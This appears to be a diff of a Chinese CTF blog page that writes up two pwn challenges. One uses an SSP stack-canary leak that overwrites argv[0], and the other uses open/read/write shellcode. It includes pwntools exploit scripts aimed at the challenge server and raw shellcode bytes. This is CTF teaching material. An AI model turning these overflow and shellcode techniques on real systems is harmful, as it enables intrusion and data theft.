@@ -14,7 +14,7 @@
 <meta property="og:site_name" content="Apr1L&#39;s blog">
 <meta property="og:description" content="Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。 先来看一下函数___stack_chk_fail源码： void __attribute__">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-09-01T11:29:52.233Z">
+<meta property="og:updated_time" content="2020-09-01T11:47:59.874Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Syc Geek 10th">
 <meta name="twitter:description" content="Baby canaryssp如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 ___stack_chk_fail 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数___stack_chk_fail产生的。 先来看一下函数___stack_chk_fail源码： void __attribute__">
@@ -106,7 +106,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Baby-canary"><span class="toc-number">1.</span> <span class="toc-text">Baby canary</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssp"><span class="toc-number">1.1.</span> <span class="toc-text">ssp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序"><span class="toc-number">1.2.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试程序"><span class="toc-number">1.3.</span> <span class="toc-text">调试程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Baby-shellcode"><span class="toc-number">2.</span> <span class="toc-text">Baby shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序-1"><span class="toc-number">2.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构造shellcode"><span class="toc-number">2.2.</span> <span class="toc-text">构造shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-canary"><span class="toc-number">1.</span> <span class="toc-text">Baby canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssp"><span class="toc-number">1.1.</span> <span class="toc-text">ssp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序"><span class="toc-number">1.2.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试程序"><span class="toc-number">1.3.</span> <span class="toc-text">调试程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-shellcode"><span class="toc-number">2.</span> <span class="toc-text">Baby shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-1"><span class="toc-number">2.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造shellcode"><span class="toc-number">2.2.</span> <span class="toc-text">构造shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -155,7 +155,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="Baby-canary"><a href="#Baby-canary" class="headerlink" title="Baby canary"></a>Baby canary</h1><h2 id="ssp"><a href="#ssp" class="headerlink" title="ssp"></a>ssp</h2><p>如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 <code>___stack_chk_fail</code> 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数<code>___stack_chk_fail</code>产生的。</p>
+    <h2 id="Baby-canary"><a href="#Baby-canary" class="headerlink" title="Baby canary"></a>Baby canary</h2><h3 id="ssp"><a href="#ssp" class="headerlink" title="ssp"></a>ssp</h3><p>如果发生栈溢出覆盖到了canary而导致canary发生了改变则跳到函数 <code>___stack_chk_fail</code> 直接终止程序。而ssp（Stack Smashing Protector ） leak正是通过故意触发canary保护执行函数<code>___stack_chk_fail</code>产生的。</p>
 <p>先来看一下函数___stack_chk_fail源码：</p>
 <pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
 {
@@ -168,7 +168,7 @@ void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *ms
     __libc_message (2, &quot;*** %s ***: %s terminatedn&quot;,
                     msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
 }</code></pre><p><code>__libc_argv[0]</code>里面装的是应用程序的路径，当canary出错报错输出中会打印出来，那如果我们在栈溢出时将它覆盖掉，那打印出来的会是什么呢？会打印我们所覆盖的相应的指针内容。所有在没有劫持到相应权限时，这个特点可以用来泄露内存中的内容。</p>
-<h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><pre><code>gdb-peda$ checksec canary2
+<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><pre><code>gdb-peda$ checksec canary2
 CANARY    : ENABLED
 FORTIFY   : disabled
 NX        : ENABLED
@@ -198,7 +198,7 @@ RELRO     : Partial</code></pre><p>发现程序开了NX和CANARY<br>在IDA看一
   printf(&quot;I hava received your message, bye!&quot;);
   return 0;
 }</code></pre><p>发现可以用ssp，接下来就是调试了。</p>
-<h2 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h2><pre><code>gdb-peda$ c
+<h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><pre><code>gdb-peda$ c
 Continuing.
 Rop is easy for U, try bypass the check!
 Here is your key: 0x602010
@@ -222,15 +222,16 @@ I hava received your message, bye!*** stack smashing detected ***: /home/suv11/D
 0912| 0x7fffffffdd48 (&quot;aaaaaaaaa&quot;)
 0920| 0x7fffffffdd50 --&gt; 0x61 (&#39;a&#39;)
 0928| 0x7fffffffdd58 --&gt; 0x7fffffffde28 --&gt; 0x7fffffffe1e5 (&quot;/home/suv11/Desktop/syc/canary2&quot;)</code></pre><p>从栈内存信息可知缓冲区v6地址为 0x7fffffffdd20， argv[0]地址为 0x7fffffffde28，从而可计算出v6与argv[0]间的偏移量为0x108（0x7fffffffde28-0x7fffffffdd20）<br>于是，我们可以覆盖argv[0]的值为flag_addr</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *
-p = remote(&#39;pwnto.fun&#39;,10007)
-#p = process(&#39;./canary2&#39;)
-p.recvuntil(&#39;Here is your key: &#39;)
-flag_addr = p.recvline()[:-1]
-addr=int(flag_addr,16)
-payload = &#39;a&#39;*0x108+p64(addr)
-p.sendline(payload)
-p.interactive()</code></pre><h1 id="Baby-shellcode"><a href="#Baby-shellcode" class="headerlink" title="Baby shellcode"></a>Baby shellcode</h1><h2 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h2><pre><code>char v4; // [rsp+0h] [rbp-30h]
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnto.fun'</span><span class="token punctuation">,</span><span class="token number">10007</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p = process('./canary2')</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Here is your key: '</span><span class="token punctuation">)</span>
+flag_addr <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
+addr<span class="token operator">=</span>int<span class="token punctuation">(</span>flag_addr<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="Baby-shellcode"><a href="#Baby-shellcode" class="headerlink" title="Baby shellcode"></a>Baby shellcode</h2><h3 id="分析程序-1"><a href="#分析程序-1" class="headerlink" title="分析程序"></a>分析程序</h3><pre><code>char v4; // [rsp+0h] [rbp-30h]
   void *buf; // [rsp+28h] [rbp-8h]
 
   buf = mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);
@@ -247,7 +248,7 @@ p.interactive()</code></pre><h1 id="Baby-shellcode"><a href="#Baby-shellcode" cl
 <li>使用read函数读取文件内容</li>
 <li>使用write函数把读取到的内容写入stdout</li>
 </ol>
-<h2 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h2><pre><code>#调用open函数
+<h3 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h3><pre><code>#调用open函数
 xor rdi,rdi;       #清空rdi寄存器
 xor rsi,rsi;       #清空rsi寄存器
 mov rax,0x2;       #rax存放open函数的系统调用号
@@ -271,19 +272,20 @@ syscall;</code></pre><p>然后编译运行，得到shellcode</p>
 <pre><code>$ nasm -f elf64 a.asm -g -F stabs -o a.o
 $ for i in $(objdump -d a.o | grep &quot;^ &quot; | cut -f2); do echo -n &#39;\x&#39;$i; done; echo
 \x48\x31\xff\x48\x31\xf6\xb8\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x0f\x05\x48\x31\xff\x48\x31\xf6\x48\x89\xc7\xb8\x00\x00\x00\x00\xbe\x00\x38\x12\x00\xba\x00\x01\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05</code></pre><p>注：<br><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">64位Linux系统调用表</a><br><a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">32位Linux系统调用表</a></p>
-<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-p = remote(&#39;pwnto.fun&#39;,12300)
-#p = process(&#39;./RushB&#39;)
+p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwnto.fun'</span><span class="token punctuation">,</span><span class="token number">12300</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p = process('./RushB')</span>
 
-payload  =&quot;\x48\x31\xFF\x48\x31\xF6\x48\xC7\xC0\x02\x00\x00\x00\x68\x66\x6C\x61\x67\x48&quot;
-payload +=&quot;\x89\xE7\x0F\x05\x48\x31\xFF\x48\x31\xF6\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00&quot;
-payload +=&quot;\x00\x48\xC7\xC6\x00\x38\x12\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC7&quot;
-payload +=&quot;\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05&quot;
+payload  <span class="token operator">=</span><span class="token string">"\x48\x31\xFF\x48\x31\xF6\x48\xC7\xC0\x02\x00\x00\x00\x68\x66\x6C\x61\x67\x48"</span>
+payload <span class="token operator">+=</span><span class="token string">"\x89\xE7\x0F\x05\x48\x31\xFF\x48\x31\xF6\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00"</span>
+payload <span class="token operator">+=</span><span class="token string">"\x00\x48\xC7\xC6\x00\x38\x12\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC7"</span>
+payload <span class="token operator">+=</span><span class="token string">"\x01\x00\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"</span>
 
-p.sendline(payload)
-p.sendline(&#39;a&#39;*(0x38)+p64(0x123000))
-p.interactive()</code></pre>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x123000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
   </div>
 </article>
 
@@ -310,7 +312,7 @@ p.interactive()</code></pre>
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Baby-canary"><span class="toc-number">1.</span> <span class="toc-text">Baby canary</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssp"><span class="toc-number">1.1.</span> <span class="toc-text">ssp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序"><span class="toc-number">1.2.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试程序"><span class="toc-number">1.3.</span> <span class="toc-text">调试程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Baby-shellcode"><span class="toc-number">2.</span> <span class="toc-text">Baby shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序-1"><span class="toc-number">2.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#构造shellcode"><span class="toc-number">2.2.</span> <span class="toc-text">构造shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-canary"><span class="toc-number">1.</span> <span class="toc-text">Baby canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssp"><span class="toc-number">1.1.</span> <span class="toc-text">ssp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序"><span class="toc-number">1.2.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调试程序"><span class="toc-number">1.3.</span> <span class="toc-text">调试程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.4.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-shellcode"><span class="toc-number">2.</span> <span class="toc-text">Baby shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-1"><span class="toc-number">2.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#构造shellcode"><span class="toc-number">2.2.</span> <span class="toc-text">构造shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
